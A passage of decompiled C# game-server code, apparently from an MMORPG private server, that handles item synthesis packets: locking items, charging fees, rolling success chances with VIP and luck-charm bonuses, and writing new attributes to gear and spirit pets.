						else if ((value36.FLD_RESIDE2 == 1 || value36.FLD_RESIDE2 == 2 || value36.FLD_RESIDE2 == 5 || value36.FLD_RESIDE2 == 6) && 装备栏包裹[num30].Get物品ID != 1000000935)
						{
							合成提示(num, 8, 0, 装备栏包裹[num30]);
							return;
						}
						if (合成物品表.Count != 0 && !合成物品表.ContainsKey(3))
						{
							合成物品表.TryAdd(3, new HcItimesClass
							{
								位置 = num30,
								物品 = 装备栏包裹[num30].物品_byte
							});
							装备栏包裹[num30].锁定 = true;
							合成提示(num, 1, 0, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex111)
					{
						MainForm.WriteLine(1, "触媒材料3[" + base.Userid + "]-[" + base.UserName + "]" + ex111.Message);
					}
					break;
				case 85:
					try
					{
						if (合成物品表.Count == 0 || 合成物品表.ContainsKey(4) || (装备栏包裹[num30].Get物品ID != 800000003 && 装备栏包裹[num30].Get物品ID != 800000004 && 装备栏包裹[num30].Get物品ID != 800000005 && 装备栏包裹[num30].Get物品ID != 800000029 && 装备栏包裹[num30].Get物品ID != 1008000136))
						{
							合成提示(num, 8, 0, 装备栏包裹[num30]);
							return;
						}
						if (合成物品表.Count != 0 && !合成物品表.ContainsKey(4))
						{
							合成物品表.TryAdd(4, new HcItimesClass
							{
								位置 = num30,
								物品 = 装备栏包裹[num30].物品_byte
							});
							装备栏包裹[num30].锁定 = true;
							合成提示(num, 1, 0, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex68)
					{
						MainForm.WriteLine(1, "触媒幸运符出错![" + base.Userid + "]-[" + base.UserName + "]" + ex68.Message);
					}
					break;
				case 89:
					try
					{
						if (合成物品表.TryGetValue(1, out var value39))
						{
							装备栏包裹[value39.位置].锁定 = false;
							合成物品表.Clear();
							合成系统解锁();
							元宝合成开关 = 0;
							合成提示(num, 1, 0, 装备栏包裹[value39.位置]);
						}
					}
					catch (Exception ex114)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 合成属性 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex114.Message);
					}
					break;
				case 100:
					try
					{
						if (base.当前操作类型 != 26 || ((合成物品表.Count <= 0) ? true : false))
						{
							break;
						}
						HcItimesClass hcItimesClass74 = null;
						HcItimesClass hcItimesClass75 = null;
						HcItimesClass hcItimesClass76 = null;
						if (合成物品表.ContainsKey(1))
						{
							hcItimesClass74 = 合成物品表[1];
						}
						if (合成物品表.ContainsKey(2))
						{
							hcItimesClass75 = 合成物品表[2];
						}
						if (合成物品表.ContainsKey(3))
						{
							hcItimesClass76 = 合成物品表[3];
						}
						if (BitConverter.ToInt64(装备栏包裹[hcItimesClass74.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass74.物品全局ID, 0) || BitConverter.ToInt64(装备栏包裹[hcItimesClass75.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass75.物品全局ID, 0) || (hcItimesClass76 != null && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass76.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass76.物品全局ID, 0)) ? true : false)))
						{
							break;
						}
						hcItimesClass74.得到属性();
						hcItimesClass74.强化属性阶段();
						hcItimesClass75.强化属性阶段();
						if (装备栏包裹[hcItimesClass74.位置].物品绑定)
						{
							合成提示(num, 2, 0, 装备栏包裹[hcItimesClass74.位置]);
						}
						else
						{
							if (!World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass74.物品id, 0), out var value91))
							{
								break;
							}
							if (value91.FLD_RESIDE2 != 23 && value91.FLD_RESIDE2 != 24 && ((value91.FLD_RESIDE2 != 25) ? true : false))
							{
								string[] array31 = new string[5] { "合成系统 WGF BUG11[", null, null, null, null };
								array31[1] = BitConverter.ToInt32(hcItimesClass74.物品id, 0).ToString();
								array31[2] = "]-[";
								array31[3] = BitConverter.ToInt32(hcItimesClass75.物品id, 0).ToString();
								array31[4] = "]";
								MainForm.WriteLine(6, string.Concat(array31));
							}
							else
							{
								if (合成手续费 <= 0)
								{
									goto IL_cceb;
								}
								if (base.Player_Money >= 合成手续费)
								{
									base.Player_Money -= 合成手续费;
									更新金钱和负重();
									goto IL_cceb;
								}
								合成提示(11, 4, 0, 装备栏包裹[hcItimesClass74.位置]);
								合成物品表.Clear();
							}
							break;
						}
						goto end_IL_c95c;
						IL_cceb:
						if (hcItimesClass74.强化数量 > 0)
						{
							MainForm.WriteLine(6, "合成系统 先强后合 BUG1[" + base.Userid + "]-[" + base.UserName + "]");
							break;
						}
						double num19 = RNG.Next(0, 110);
						int num20 = hcItimesClass75.阶段数量;
						if (num20 > 10)
						{
							if (num20 > 10 && ((num20 <= 20) ? true : false))
							{
								num20 = 10;
							}
							else if (num20 > 20 && ((num20 <= 30) ? true : false))
							{
								num20 = 15;
							}
							else if (num20 > 30 && ((num20 <= 40) ? true : false))
							{
								num20 = 20;
							}
							else if (num20 > 40 && ((num20 <= 50) ? true : false))
							{
								num20 = 20;
							}
							else if (num20 > 50 && ((num20 <= 60) ? true : false))
							{
								num20 = 25;
							}
							else if (num20 > 60 && ((num20 <= 70) ? true : false))
							{
								num20 = 30;
							}
							else if (num20 > 70 && ((num20 <= 80) ? true : false))
							{
								num20 = 35;
							}
							if (num20 > 80 && ((num20 <= 100) ? true : false))
							{
								num20 = 50;
							}
						}
						double num21 = hcItimesClass74.属性1.数量 * 20 + hcItimesClass74.属性2.数量 * 20 + hcItimesClass74.属性3.数量 * 20 + hcItimesClass74.属性4.数量 * 20 + num20;
						if (hcItimesClass74.属性1.属性数量 != 0 && hcItimesClass74.属性2.属性数量 != 0 && hcItimesClass74.属性3.属性数量 != 0 && ((hcItimesClass74.属性4.属性数量 != 0) ? true : false))
						{
							break;
						}
						if (hcItimesClass76 != null)
						{
							num19 += (double)幸运符加成(BitConverter.ToInt32(hcItimesClass76.物品id, 0));
						}
						if (元宝合成开关 == 1)
						{
							num19 += 5.0;
						}
						if (base.FLD_VIP == 1)
						{
							num19 += 100.0 * World.VIP合成率增加百分比;
						}
						if (World.合成率 != 0.0)
						{
							num19 += 100.0 * World.合成率;
						}
						if (base.FLD_装备_追加_合成成功率百分比 > 0.0)
						{
							num19 += 100.0 * base.FLD_装备_追加_合成成功率百分比 / 2.0;
						}
						if (base.FLD_VIP == 8)
						{
							num21 = 0.0;
						}
						if (num19 >= num21)
						{
							if (hcItimesClass74.属性1.属性类型 == 0)
							{
								if (hcItimesClass75.阶段类型 == 8)
								{
									hcItimesClass74.属性1.气功属性类型 = hcItimesClass75.气功属性类型;
								}
								hcItimesClass74.属性1.属性类型 = hcItimesClass75.阶段类型;
								hcItimesClass74.属性1.属性数量 = hcItimesClass75.阶段数量;
								hcItimesClass74.设置属性();
							}
							else if (hcItimesClass74.属性2.属性类型 == 0)
							{
								if (hcItimesClass75.阶段类型 == 8)
								{
									hcItimesClass74.属性2.气功属性类型 = hcItimesClass75.气功属性类型;
								}
								hcItimesClass74.属性2.属性类型 = hcItimesClass75.阶段类型;
								hcItimesClass74.属性2.属性数量 = hcItimesClass75.阶段数量;
								hcItimesClass74.设置属性();
							}
							else if (hcItimesClass74.属性3.属性类型 == 0)
							{
								if (hcItimesClass75.阶段类型 == 8)
								{
									hcItimesClass74.属性3.气功属性类型 = hcItimesClass75.气功属性类型;
								}
								hcItimesClass74.属性3.属性类型 = hcItimesClass75.阶段类型;
								hcItimesClass74.属性3.属性数量 = hcItimesClass75.阶段数量;
								hcItimesClass74.设置属性();
							}
							else if (hcItimesClass74.属性4.属性类型 == 0)
							{
								if (hcItimesClass75.阶段类型 == 8)
								{
									hcItimesClass74.属性4.气功属性类型 = hcItimesClass75.气功属性类型;
								}
								hcItimesClass74.属性4.属性类型 = hcItimesClass75.阶段类型;
								hcItimesClass74.属性4.属性数量 = hcItimesClass75.阶段数量;
								hcItimesClass74.设置属性();
							}
							合成提示(num, 1, 0, 装备栏包裹[hcItimesClass74.位置]);
						}
						else
						{
							合成提示(num, 0, 0, 装备栏包裹[hcItimesClass74.位置]);
						}
						减去物品(hcItimesClass75.位置, 1);
						if (hcItimesClass76 != null)
						{
							减去物品(hcItimesClass76.位置, 1);
						}
						if (BitConverter.ToInt32(装备栏包裹[hcItimesClass74.位置].物品ID, 0) != 0 && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass74.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass74.物品全局ID, 0)) ? true : false))
						{
							减去物品(hcItimesClass74.位置, 1);
							增加物品(hcItimesClass74.物品全局ID, hcItimesClass74.物品id, hcItimesClass74.位置, hcItimesClass74.物品数量, hcItimesClass74.物品属性);
						}
						装备栏包裹[hcItimesClass74.位置].锁定 = false;
						合成物品表.Clear();
						合成系统解锁();
						元宝合成开关 = 0;
						合成手续费 = 0;
						end_IL_c95c:;
					}
					catch (Exception ex20)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 合成属性 合成 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex20.Message);
					}
					break;
				case 101:
					try
					{
						ItmeClass value76 = new ItmeClass();
						if (!合成物品表.ContainsKey(1) && World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0), out value76) && (value76.FLD_RESIDE2 == 23 || value76.FLD_RESIDE2 == 24 || value76.FLD_RESIDE2 == 25) && (装备栏包裹[num30].FLD_MAGIC1 == 0 || 装备栏包裹[num30].FLD_MAGIC2 == 0 || 装备栏包裹[num30].FLD_MAGIC3 == 0 || 装备栏包裹[num30].FLD_MAGIC4 == 0))
						{
							int 钱数5 = (合成手续费 = 计算合成强化费用(value76, num30, num));
							HcItimesClass hcItimesClass19 = new HcItimesClass();
							hcItimesClass19.位置 = num30;
							hcItimesClass19.物品 = 装备栏包裹[num30].物品_byte;
							HcItimesClass value77 = hcItimesClass19;
							装备栏包裹[num30].锁定 = true;
							合成物品表.TryAdd(1, value77);
							合成提示(num, 1, 钱数5, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex14)
					{
						MainForm.WriteLine(1, "合成系统 合成属性 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex14.Message);
					}
					break;
				case 102:
					try
					{
						if (合成物品表.ContainsKey(1))
						{
							HcItimesClass hcItimesClass116 = 合成物品表[1];
							if (!装备栏包裹[num30].物品绑定 && World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0), out var value172) && (value172.FLD_PID == 800000032 || value172.FLD_PID == 800000033) && World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass116.物品id, 0), out var value173) && (value172.FLD_PID != 800000032 || value173.FLD_JOB_LEVEL < 3) && (value172.FLD_PID != 800000033 || value173.FLD_JOB_LEVEL >= 3) && 合成物品表.Count != 0 && !合成物品表.ContainsKey(2))
							{
								合成物品表.TryAdd(2, new HcItimesClass
								{
									位置 = num30,
									物品 = 装备栏包裹[num30].物品_byte
								});
								装备栏包裹[num30].锁定 = true;
								合成提示(num, 1, 0, 装备栏包裹[num30]);
							}
						}
					}
					catch (Exception ex82)
					{
						MainForm.WriteLine(1, "合成系统 合成属性 合成2 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex82.Message);
					}
					break;
				case 103:
					try
					{
						if (合成物品表.Count != 0 && !合成物品表.ContainsKey(3))
						{
							合成物品表.TryAdd(3, new HcItimesClass
							{
								位置 = num30,
								物品 = 装备栏包裹[num30].物品_byte
							});
							装备栏包裹[num30].锁定 = true;
							合成提示(num, 1, 0, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex56)
					{
						MainForm.WriteLine(1, "合成系统 合成属性 合成3 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex56.Message);
					}
					break;
				case 109:
					try
					{
						if (合成物品表.TryGetValue(1, out var value158))
						{
							装备栏包裹[value158.位置].锁定 = false;
							合成提示(num, 1, 0, 装备栏包裹[value158.位置]);
							合成物品表.Clear();
							合成系统解锁();
							元宝合成开关 = 0;
						}
					}
					catch (Exception ex74)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 合成属性 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex74.Message);
					}
					break;
				case 110:
				{
					if (base.当前操作类型 != 27 || 人物灵兽 == null || ((合成物品表.Count <= 0) ? true : false))
					{
						break;
					}
					HcItimesClass hcItimesClass117 = null;
					HcItimesClass hcItimesClass118 = null;
					if (合成物品表.ContainsKey(2))
					{
						hcItimesClass117 = 合成物品表[2];
					}
					if (合成物品表.ContainsKey(3))
					{
						hcItimesClass118 = 合成物品表[3];
					}
					ItmeClass value174 = new ItmeClass();
					if (BitConverter.ToInt64(装备栏包裹[hcItimesClass117.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass117.物品全局ID, 0) || (hcItimesClass118 != null && BitConverter.ToInt64(装备栏包裹[hcItimesClass118.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass118.物品全局ID, 0)) || !World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass117.物品id, 0), out value174) || (value174.FLD_PID != 800000030 && ((value174.FLD_PID != 800000031) ? true : false)))
					{
						break;
					}
					hcItimesClass117.强化属性阶段();
					if (人物灵兽.FLD_MAGIC1 != 0 && 人物灵兽.FLD_MAGIC2 != 0 && 人物灵兽.FLD_MAGIC3 != 0 && 人物灵兽.FLD_MAGIC4 != 0 && ((人物灵兽.FLD_MAGIC5 != 0) ? true : false))
					{
						break;
					}
					int num78 = ((value174.FLD_PID != 800000030) ? 100000 : 50000);
					if (base.Player_Money < num78)
					{
						try
						{
							if (合成物品表.TryGetValue(1, out var value175))
							{
								装备栏包裹[value175.位置].锁定 = false;
								合成物品表.Clear();
								合成系统解锁();
								合成提示(num, 0, 0, 装备栏包裹[num30]);
							}
							元宝合成开关 = 0;
							合成提示(29, 0, 0, 装备栏包裹[num30]);
							系统提示("金额不足, 需要支付" + num78 + "两游戏币。");
						}
						catch (Exception ex83)
						{
							元宝合成开关 = 0;
							MainForm.WriteLine(1, "合成系统 先强后合 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex83.Message);
						}
						break;
					}
					base.Player_Money -= num78;
					更新金钱和负重();
					double num79 = RNG.Next(0, 110);
					double num80 = hcItimesClass117.阶段数量;
					if (人物灵兽.FLD_MAGIC1 != 0)
					{
						num80 += 20.0;
					}
					if (人物灵兽.FLD_MAGIC2 != 0)
					{
						num80 += 20.0;
					}
					if (人物灵兽.FLD_MAGIC3 != 0)
					{
						num80 += 20.0;
					}
					if (人物灵兽.FLD_MAGIC4 != 0)
					{
						num80 += 20.0;
					}
					if (hcItimesClass118 != null)
					{
						num79 += (double)幸运符加成(BitConverter.ToInt32(hcItimesClass118.物品id, 0));
					}
					if (元宝合成开关 == 1)
					{
						num79 += 5.0;
					}
					if (base.FLD_VIP == 1)
					{
						num79 += 100.0 * World.VIP合成率增加百分比;
					}
					if (World.合成率 != 0.0)
					{
						num79 += 100.0 * World.合成率;
					}
					if (base.FLD_装备_追加_合成成功率百分比 > 0.0)
					{
						num79 += 100.0 * base.FLD_装备_追加_合成成功率百分比 / 2.0;
					}
					if (base.FLD_VIP == 8)
					{
						num80 = 0.0;
					}
					if (num79 >= num80)
					{
						if (人物灵兽.FLD_MAGIC1 == 0)
						{
							if (hcItimesClass117.阶段数量.ToString().Length == 1)
							{
								人物灵兽.FLD_MAGIC1 = int.Parse(hcItimesClass117.阶段类型 + "000000" + hcItimesClass117.阶段数量);
							}
							else if (hcItimesClass117.阶段数量.ToString().Length == 2)
							{
								人物灵兽.FLD_MAGIC1 = int.Parse(hcItimesClass117.阶段类型 + "00000" + hcItimesClass117.阶段数量);
							}
						}
						else if (人物灵兽.FLD_MAGIC2 == 0)
						{
							if (hcItimesClass117.阶段数量.ToString().Length == 1)
							{
								人物灵兽.FLD_MAGIC2 = int.Parse(hcItimesClass117.阶段类型 + "000000" + hcItimesClass117.阶段数量);
							}
							else if (hcItimesClass117.阶段数量.ToString().Length == 2)
							{
								人物灵兽.FLD_MAGIC2 = int.Parse(hcItimesClass117.阶段类型 + "00000" + hcItimesClass117.阶段数量);
							}
						}
						else if (人物灵兽.FLD_MAGIC3 == 0)
						{
							if (hcItimesClass117.阶段数量.ToString().Length == 1)
							{
								人物灵兽.FLD_MAGIC3 = int.Parse(hcItimesClass117.阶段类型 + "000000" + hcItimesClass117.阶段数量);
							}
							else if (hcItimesClass117.阶段数量.ToString().Length == 2)
							{
								人物灵兽.FLD_MAGIC3 = int.Parse(hcItimesClass117.阶段类型 + "00000" + hcItimesClass117.阶段数量);
							}
						}
						else if (人物灵兽.FLD_MAGIC4 == 0)
						{
							if (hcItimesClass117.阶段数量.ToString().Length == 1)
							{
								人物灵兽.FLD_MAGIC4 = int.Parse(hcItimesClass117.阶段类型 + "000000" + hcItimesClass117.阶段数量);
							}
							else if (hcItimesClass117.阶段数量.ToString().Length == 2)
							{
								人物灵兽.FLD_MAGIC4 = int.Parse(hcItimesClass117.阶段类型 + "00000" + hcItimesClass117.阶段数量);
							}
						}
						else if (人物灵兽.FLD_MAGIC5 == 0)
						{
							if (hcItimesClass117.阶段数量.ToString().Length == 1)
							{
								人物灵兽.FLD_MAGIC5 = int.Parse(hcItimesClass117.阶段类型 + "000000" + hcItimesClass117.阶段数量);
							}
							else if (hcItimesClass117.阶段数量.ToString().Length == 2)
							{
								人物灵兽.FLD_MAGIC5 = int.Parse(hcItimesClass117.阶段类型 + "00000" + hcItimesClass117.阶段数量);
							}
						}
						更新灵兽武功和状态();
						合成提示(num, 1, 0, 装备栏包裹[num30]);
					}
					else
					{
						合成提示(num, 0, 0, 装备栏包裹[num30]);
					}
					减去物品(hcItimesClass117.位置, 1);
					if (hcItimesClass118 != null)
					{
						减去物品(hcItimesClass118.位置, 1);
					}
					合成物品表.Clear();
					合成系统解锁();
					元宝合成开关 = 0;
					break;
				}
				case 112:
					try
					{
						if (合成物品表.ContainsKey(2) || 人物灵兽 == null || (人物灵兽.FLD_MAGIC1 != 0 && 人物灵兽.FLD_MAGIC2 != 0 && 人物灵兽.FLD_MAGIC3 != 0 && 人物灵兽.FLD_MAGIC4 != 0 && ((人物灵兽.FLD_MAGIC5 != 0) ? true : false)))
						{
							break;
						}
						int num64 = BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0);
						int num65 = num64;
						int num66 = num65;
						if (num66 == 0 || (uint)(num66 - 800000030) > 1u)
						{
							return;
						}
						switch (人物灵兽.FLD_JOB_LEVEL)
						{
						case 0:
						case 1:
						case 2:
							if (num64 != 800000030)
							{
								return;
							}
							break;
						case 3:
							if (num64 != 800000031)
							{
								return;
							}
							break;
						}
						合成物品表.TryAdd(2, new HcItimesClass
						{
							位置 = num30,
							物品 = 装备栏包裹[num30].物品_byte
						});
						装备栏包裹[num30].锁定 = true;
						合成提示(num, 1, 0, 装备栏包裹[num30]);
						return;
					}
					catch (Exception ex64)
					{
						MainForm.WriteLine(1, "合成系统 合成属性 合成2 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex64.Message);
					}
					break;
				case 113:
					try
					{
						if (合成物品表.Count != 0 && !合成物品表.ContainsKey(3))
						{
							合成物品表.TryAdd(3, new HcItimesClass
							{
								位置 = num30,
								物品 = 装备栏包裹[num30].物品_byte
							});
							装备栏包裹[num30].锁定 = true;
							合成提示(num, 1, 0, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex88)
					{
						MainForm.WriteLine(1, "合成系统 合成属性 合成3 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex88.Message);
					}
					break;
				case 119:
					try
					{
						if (合成物品表.TryGetValue(2, out var value150))
						{
							装备栏包裹[value150.位置].锁定 = false;
							合成物品表.Clear();
							合成系统解锁();
							元宝合成开关 = 0;
							合成提示(num, 1, 0, 装备栏包裹[value150.位置]);
						}
					}
					catch (Exception ex69)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 合成属性 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex69.Message);
					}
					break;
				case 120:
				{
					if (base.当前操作类型 != 37)
					{
						break;
					}
					int num126 = 封包数据[14];
					int num128 = 封包数据[26];
					if (装备栏包裹[num126].Get物品ID == 0L || ((装备栏包裹[num128].Get物品ID == 0L) ? true : false))
					{
						合成提示(num, 2, 0, 装备栏包裹[num126]);
						break;
					}
					if (!World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num126].物品ID, 0), out var value34))
					{
						合成提示(num, 0, 0, 装备栏包裹[num126]);
						break;
					}
					if (value34.FLD_RESIDE2 != 12)
					{
						合成提示(num, 0, 0, 装备栏包裹[num126]);
						break;
					}
					if (!World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num128].物品ID, 0), out value34))
					{
						合成提示(num, 0, 0, 装备栏包裹[num128]);
						break;
					}
					if (value34.FLD_RESIDE2 != 14)
					{
						合成提示(num, 0, 0, 装备栏包裹[num126]);
						break;
					}
					if (装备栏包裹[num126].物品绑定 || (装备栏包裹[num128].物品绑定 ? true : false))
					{
						合成提示(num, 0, 0, 装备栏包裹[num126]);
						break;
					}
					if (装备栏包裹[num126].FLD_MAGIC1 == 0 || 装备栏包裹[num126].FLD_MAGIC2 == 0 || 装备栏包裹[num126].FLD_MAGIC3 == 0 || ((装备栏包裹[num126].FLD_MAGIC4 == 0) ? true : false))
					{
						合成提示(num, 0, 0, 装备栏包裹[num126]);
						break;
					}
					int num129 = GetEmptyBagSlot();
					if (num129 == -1)
					{
						系统提示("背包没有空位了。");
						break;
					}
					byte[] array14 = new byte[20];
					Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array14, 0, 4);
					Buffer.BlockCopy(BitConverter.GetBytes(装备栏包裹[num126].FLD_MAGIC1), 0, array14, 4, 4);
					Buffer.BlockCopy(BitConverter.GetBytes(装备栏包裹[num126].FLD_MAGIC2), 0, array14, 8, 4);
					Buffer.BlockCopy(BitConverter.GetBytes(装备栏包裹[num126].FLD_MAGIC3), 0, array14, 12, 4);
					Buffer.BlockCopy(BitConverter.GetBytes(装备栏包裹[num126].FLD_MAGIC4), 0, array14, 16, 4);
					增加物品2(装备栏包裹[num128].物品全局ID, BitConverter.GetBytes(装备栏包裹[num128].Get物品ID), num129, BitConverter.GetBytes(1), array14);
					减去物品(num126, 1);
					减去物品(num128, 1);
					合成提示(num, 1, 0, 装备栏包裹[num128]);
					break;
				}
				case 140:
					try
					{
						byte[] array10 = new byte[4];
						byte[] array11 = new byte[4];
						byte[] array13 = new byte[2];
						Buffer.BlockCopy(封包数据, 14, array10, 0, 4);
						Buffer.BlockCopy(封包数据, 18, array11, 0, 4);
						Buffer.BlockCopy(封包数据, 110, array13, 0, 2);
						int num92 = BitConverter.ToInt16(array13, 0);
						switch (BitConverter.ToInt32(array11, 0))
						{
						case 1008001078:
						{
							HcItimesClass hcItimesClass144 = null;
							HcItimesClass hcItimesClass145 = null;
							HcItimesClass hcItimesClass146 = null;
							if (合成物品表.ContainsKey(1))
							{
								hcItimesClass144 = 合成物品表[1];
							}
							if (合成物品表.ContainsKey(2))
							{
								hcItimesClass145 = 合成物品表[2];
							}
							if (合成物品表.ContainsKey(3))
							{
								hcItimesClass146 = 合成物品表[3];
							}
							if (BitConverter.ToInt64(装备栏包裹[hcItimesClass144.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass144.物品全局ID, 0) || BitConverter.ToInt64(装备栏包裹[hcItimesClass145.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass145.物品全局ID, 0) || (hcItimesClass146 != null && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass146.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass146.物品全局ID, 0)) ? true : false)))
							{
								break;
							}
							hcItimesClass144.得到属性();
							hcItimesClass144.强化属性阶段();
							hcItimesClass145.得到属性();
							hcItimesClass145.强化属性阶段();
							ItmeClass value31;
							if (装备栏包裹[hcItimesClass144.位置].物品绑定)
							{
								合成提示(21, 3, 0, 装备栏包裹[hcItimesClass144.位置]);
								合成物品表.Clear();
							}
							else if (World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass144.物品id, 0), out value31))
							{
								if ((value31.FLD_RESIDE2 == 12 || value31.FLD_RESIDE2 == 14) && BitConverter.ToInt32(hcItimesClass145.物品id, 0) != 800000013)
								{
									合成提示(21, 5, 0, 装备栏包裹[hcItimesClass144.位置]);
									合成物品表.Clear();
									break;
								}
								if (合成手续费 > 0)
								{
									if (base.Player_Money < 合成手续费)
									{
										合成提示(11, 4, 0, 装备栏包裹[hcItimesClass144.位置]);
										合成物品表.Clear();
										break;
									}
									base.Player_Money -= 合成手续费;
									更新金钱和负重();
								}
								double num118 = RNG.Next(1, 100);
								int 阶段数量4 = hcItimesClass145.阶段数量;
								if (阶段数量4 > 35)
								{
									if (阶段数量4 > 90 && ((阶段数量4 <= 100) ? true : false))
									{
										int num124 = 阶段数量4 - 65;
									}
									else if (阶段数量4 > 70 && ((阶段数量4 <= 90) ? true : false))
									{
										int num123 = 阶段数量4 - 60;
									}
									else if (阶段数量4 > 50 && ((阶段数量4 <= 70) ? true : false))
									{
										int num122 = 4;
									}
									else if (阶段数量4 > 45 && ((阶段数量4 <= 50) ? true : false))
									{
										int num121 = 3;
									}
									else if (阶段数量4 > 40 && ((阶段数量4 <= 45) ? true : false))
									{
										int num120 = 2;
									}
									else if (阶段数量4 >= 35 && ((阶段数量4 <= 40) ? true : false))
									{
										int num119 = 1;
									}
								}
								double num125 = World.属性替换失败率;
								if (hcItimesClass146 != null)
								{
									num118 += (double)幸运符加成(BitConverter.ToInt32(hcItimesClass146.物品id, 0));
								}
								if (元宝合成开关 == 1)
								{
									num118 += 5.0;
								}
								if (base.FLD_VIP == 1)
								{
									num118 += 100.0 * World.VIP合成率增加百分比;
								}
								if (World.合成率 != 0.0)
								{
									num118 += 100.0 * World.合成率;
								}
								if (base.FLD_人物_追加_合成成功率百分比 != 0.0)
								{
									num118 += 100.0 * base.FLD_人物_追加_合成成功率百分比;
								}
								if (base.FLD_装备_追加_合成成功率百分比 > 0.0)
								{
									num118 += 100.0 * base.FLD_装备_追加_合成成功率百分比 / 2.0;
								}
								if (num118 >= num125)
								{
									if (hcItimesClass145.阶段数量 > 1)
									{
										if (hcItimesClass144.属性1.属性数量 != hcItimesClass145.阶段数量)
										{
											hcItimesClass144.属性1.气功属性类型 = hcItimesClass145.气功属性类型;
											hcItimesClass144.属性1.属性类型 = hcItimesClass145.阶段类型;
											hcItimesClass144.属性1.属性数量 = hcItimesClass145.阶段数量;
											hcItimesClass144.设置属性();
										}
										else if ((hcItimesClass144.属性1.气功属性类型 == hcItimesClass145.截取气功属性类型) & (hcItimesClass144.属性2.属性数量 != hcItimesClass145.阶段数量))
										{
											hcItimesClass144.属性2.气功属性类型 = hcItimesClass145.气功属性类型;
											hcItimesClass144.属性2.属性类型 = hcItimesClass145.阶段类型;
											hcItimesClass144.属性2.属性数量 = hcItimesClass145.阶段数量;
											hcItimesClass144.设置属性();
										}
										else if ((hcItimesClass144.属性2.气功属性类型 == hcItimesClass145.截取气功属性类型) & (hcItimesClass144.属性3.属性数量 != hcItimesClass145.阶段数量))
										{
											hcItimesClass144.属性3.气功属性类型 = hcItimesClass145.气功属性类型;
											hcItimesClass144.属性3.属性类型 = hcItimesClass145.阶段类型;
											hcItimesClass144.属性3.属性数量 = hcItimesClass145.阶段数量;
											hcItimesClass144.设置属性();
										}
										else if ((hcItimesClass144.属性3.气功属性类型 == hcItimesClass145.截取气功属性类型) & (hcItimesClass144.属性4.属性数量 != hcItimesClass145.阶段数量))
										{
											hcItimesClass144.属性4.气功属性类型 = hcItimesClass145.气功属性类型;
											hcItimesClass144.属性4.属性类型 = hcItimesClass145.阶段类型;
											hcItimesClass144.属性4.属性数量 = hcItimesClass145.阶段数量;
											hcItimesClass144.设置属性();
										}
									}
									else if (hcItimesClass144.属性1.气功属性类型 != hcItimesClass145.截取气功属性类型)
									{
										hcItimesClass144.属性1.气功属性类型 = hcItimesClass145.气功属性类型;
										hcItimesClass144.属性1.属性类型 = hcItimesClass145.阶段类型;
										hcItimesClass144.属性1.属性数量 = hcItimesClass145.阶段数量;
										hcItimesClass144.设置属性();
									}
									else if ((hcItimesClass144.属性1.气功属性类型 == hcItimesClass145.截取气功属性类型) & (hcItimesClass144.属性2.气功属性类型 != hcItimesClass145.截取气功属性类型))
									{
										hcItimesClass144.属性2.气功属性类型 = hcItimesClass145.气功属性类型;
										hcItimesClass144.属性2.属性类型 = hcItimesClass145.阶段类型;
										hcItimesClass144.属性2.属性数量 = hcItimesClass145.阶段数量;
										hcItimesClass144.设置属性();
									}
									else if ((hcItimesClass144.属性2.气功属性类型 == hcItimesClass145.截取气功属性类型) & (hcItimesClass144.属性3.气功属性类型 != hcItimesClass145.截取气功属性类型))
									{
										hcItimesClass144.属性3.气功属性类型 = hcItimesClass145.气功属性类型;
										hcItimesClass144.属性3.属性类型 = hcItimesClass145.阶段类型;
										hcItimesClass144.属性3.属性数量 = hcItimesClass145.阶段数量;
										hcItimesClass144.设置属性();
									}
									else if ((hcItimesClass144.属性3.气功属性类型 == hcItimesClass145.截取气功属性类型) & (hcItimesClass144.属性4.气功属性类型 != hcItimesClass145.截取气功属性类型))
									{
										hcItimesClass144.属性4.气功属性类型 = hcItimesClass145.气功属性类型;
										hcItimesClass144.属性4.属性类型 = hcItimesClass145.阶段类型;
										hcItimesClass144.属性4.属性数量 = hcItimesClass145.阶段数量;
										hcItimesClass144.设置属性();
									}
									RxjhClass.合成记录(base.Userid, base.UserName, value31.ItmeNAME, num, "披风成品属性符", "成功", 装备栏包裹[hcItimesClass144.位置]);
									合成提示(num, 1, 0, 装备栏包裹[hcItimesClass144.位置]);
								}
								else
